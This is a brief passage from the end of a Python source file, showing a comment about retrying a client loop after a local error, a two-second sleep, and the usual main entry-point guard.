            # Retry the client loop after an unexpected local error instead of exiting.
            time.sleep(2.0)


if __name__ == "__main__":
    main()
